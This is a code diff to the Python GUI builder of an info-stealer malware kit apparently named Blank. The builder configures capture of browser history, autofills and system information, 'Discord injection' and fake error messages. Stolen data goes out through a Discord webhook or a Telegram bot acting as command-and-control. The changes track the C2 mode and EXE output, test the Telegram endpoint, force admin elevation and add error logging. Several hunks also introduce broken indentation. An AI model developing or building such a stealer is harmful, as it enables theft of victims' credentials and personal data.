@@ -713,7 +713,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
         )
         self.captureHistoryCheckboxControl.pack(anchor="w", pady=5)
         
-        self.captureAutofillsCheckboxControl = ctk.CTkSwitch(
+                self.captureAutofillsCheckboxControl = ctk.CTkSwitch(
             browser_right,
             text="Autofills",
             variable=self.captureAutofillsVar,
@@ -723,7 +723,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
         )
         self.captureAutofillsCheckboxControl.pack(anchor="w", pady=5)
         
-                # System information collection
+        # System information collection
         system_title = ctk.CTkLabel(
             system_frame,
             text="System Information",
@@ -1216,6 +1216,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
     def C2ModeButtonControl_Callback(self) -> None:
         """Handle C2 mode selection changes"""
         if self.c2_mode_var.get() == 0:  # Discord mode
+            self.C2Mode = 0
             self.c2_url_label.configure(text="Webhook URL:")
             self.C2EntryControl.configure(placeholder_text="Enter Discord webhook URL here")
             self.testC2ButtonControl.configure(text="Test Webhook")
@@ -1224,6 +1225,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
             self.pingMeCheckboxControl.configure(state="normal")
             self.discordInjectionCheckboxControl.configure(state="normal")
         else:  # Telegram mode
+            self.C2Mode = 1
             self.c2_url_label.configure(text="Bot Config:")
             self.C2EntryControl.configure(placeholder_text="Enter [Telegram Bot Token]$[Chat ID]")
             self.testC2ButtonControl.configure(text="Test Endpoint")
@@ -1316,6 +1318,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
         if self.build_mode_var.get() == PYMODE:
             # Disable EXE-only options
+            self.OutputAsExe = False
             for control in exeOnlyControls:
                 control.configure(state="disabled")
                 
@@ -1330,6 +1333,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
                 self.bindExeButtonControl_Callback()  # Remove bound executable
         else:
             # Enable EXE-only options
+            self.OutputAsExe = True
             for control in exeOnlyControls:
                 control.configure(state="normal")
 
@@ -1434,13 +1438,12 @@ class BuilderOptionsFrame(ctk.CTkFrame):
                     req.add_header("User-Agent", "Mozilla/5.0")
                     
                     with urlopen(req) as response:
-                        result = json.loads(response.read().decode())
+                                                result = json.loads(response.read().decode())
                         if not result.get("ok"):
                             messagebox.showerror(APPLICATION_NAME, "Invalid bot token!")
                             return
                     
                     # Test sending a message
-                                        # Test sending a message
                     test_message = urllib.parse.quote("Your endpoint is working!")
                     req = Request(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={test_message}", method="GET")
                     req.add_header("User-Agent", "Mozilla/5.0")
@@ -1458,11 +1461,12 @@ class BuilderOptionsFrame(ctk.CTkFrame):
                 except Exception as e:
                     messagebox.showerror(APPLICATION_NAME, f"An error occurred: {str(e)}")
             
-            # Re-enable UI elements
+            # Re-enable UI elements regardless of success/failure
             self.C2EntryControl.configure(state="normal")
             self.testC2ButtonControl.configure(state="normal")
             self.buildButtonControl.configure(state="normal")
         
+        # Run the check in a separate thread to keep UI responsive
         threading.Thread(target=check, daemon=True).start()
 
     def fakeError_Event(self) -> None:
@@ -1974,51 +1978,65 @@ class Builder(ctk.CTk):
 
 
 if __name__ == "__main__":
-    if os.name == "nt":
-        # Check for required components
-        if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Components")):
-            messagebox.showerror(
-                APPLICATION_NAME,
-                "Components folder not found. Please reinstall the application."
-            )
-            exit(1)
-        
-        # Check Python version
-        version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
-        if not (float(f"{sys.version_info.major}.{sys.version_info.minor}") >= 3.10):
-            messagebox.showerror(
-                APPLICATION_NAME,
-                f"Your Python version is {version} but version 3.10+ is required.\n"
-                "Please update your Python installation."
-            )
-            exit(1)
+    try:
+        if os.name == "nt":
+            # Check for required components
+            if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Components")):
+                messagebox.showerror(
+                    APPLICATION_NAME,
+                    "Components folder not found. Please reinstall the application."
+                )
+                exit(1)
             
-        if "windowsapps" in sys.executable.lower():
-            messagebox.showerror(
-                APPLICATION_NAME,
-                "It appears you installed Python from the Microsoft Store.\n"
-                "Please install Python from the official website: https://python.org/downloads"
-            )
-            exit(1)
+            # Check Python version
+            version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
+            if not (float(f"{sys.version_info.major}.{sys.version_info.minor}") >= 3.10):
+                messagebox.showerror(
+                    APPLICATION_NAME,
+                    f"Your Python version is {version} but version 3.10+ is required.\n"
+                    "Please update your Python installation."
+                )
+                exit(1)
+                
+            if "windowsapps" in sys.executable.lower():
+                messagebox.showerror(
+                    APPLICATION_NAME,
+                    "It appears you installed Python from the Microsoft Store.\n"
+                    "Please install Python from the official website: https://python.org/downloads"
+                )
+                exit(1)
 
-        Utility.CheckConfiguration()
-        
-        if Utility.CheckForUpdates():
-            response = messagebox.askyesno(
-                "Update Available", 
-                "A new version is available. It's recommended to update to the latest version.\n\n"
-                "Would you like to visit the download page now?"
-            )
-            if response:
-                webbrowser.open_new_tab("https://github.com/tuffycodes/Blank")
+            Utility.CheckConfiguration()
+            
+            if Utility.CheckForUpdates():
+                response = messagebox.askyesno(
+                    "Update Available", 
+                    "A new version is available. It's recommended to update to the latest version.\n\n"
+                    "Would you like to visit the download page now?"
+                )
+                if response:
+                    webbrowser.open_new_tab("https://github.com/tuffycodes/Blank")
+                    exit(0)
+                
+            if not Utility.IsAdmin():
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                 exit(0)
             
-        if not Utility.IsAdmin():
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-            exit(0)
+            # Start the application
+            app = Builder()
+            app.mainloop()
+        else:
+            messagebox.showerror(APPLICATION_NAME, "Only Windows operating system is supported.")
+    except Exception as e:
+        # Log and display any unhandled exceptions
+        error_msg = f"Fatal error: {str(e)}\n\n{traceback.format_exc()}"
         
-        # Start the application
-        app = Builder()
-        app.mainloop()
-    else:
-        messagebox.showerror(APPLICATION_NAME, "Only Windows operating system is supported.")
+        try:
+            # Write to log file
+            with open("error_log.txt", "a") as f:
+                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] FATAL ERROR\n{error_msg}\n\n")
+        except:
+            pass
+        
+        # Display error message
+        messagebox.showerror(APPLICATION_NAME, f"A fatal error occurred: {str(e)}\n\nCheck error_log.txt for details.")
